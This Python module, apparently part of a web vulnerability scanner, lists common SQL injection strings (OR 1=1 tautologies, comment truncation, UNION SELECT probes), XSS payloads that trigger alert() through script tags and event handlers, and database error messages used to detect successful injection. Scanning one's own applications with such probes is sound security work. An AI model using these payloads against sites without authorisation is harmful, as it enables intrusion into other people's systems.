"""
Payloads Module
Contains SQL Injection and XSS attack payloads for testing
"""

# SQL Injection Payloads
SQLI_PAYLOADS = [
    "'",
    "'-- ",
    "' OR 'a'='a",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "') OR ('1'='1--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' AND 1=1",
    "1' AND 1=2",
    "' AND 1=1--",
    "' AND 1=2--",
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "'\"><script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<svg/onload=alert('XSS')>",
    "<body style=\"background:url('javascript:alert(1)')\">",
    "<div onmouseover=alert('XSS')>test</div>",
    "<marquee onstart=alert('XSS')>test</marquee>",
]

# SQL Error Patterns (indicators of SQL injection vulnerability)
SQL_ERROR_PATTERNS = [
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "mysql_connect",
    "mysql_error",
    "Warning: mysql",
    "PostgreSQL query failed",
    "PostgreSQL ERROR",
    "Warning: pg_",
    "valid MySQL result",
    "MySqlClient",
    "SQL syntax",
    "SQLException",
    "SQLiteException",
    "SQLite3::",
    "ORA-00921",
    "ORA-00933",
    "Oracle error",
    "Microsoft OLE DB Provider",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "SQLException",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "mysqli",
    "you have an error in your sql syntax",
    "mariadb",
    "fatal error",
    "uncaught mysqli_sql_exception",
]

# XSS Detection Patterns
XSS_DETECTION_PATTERNS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
]

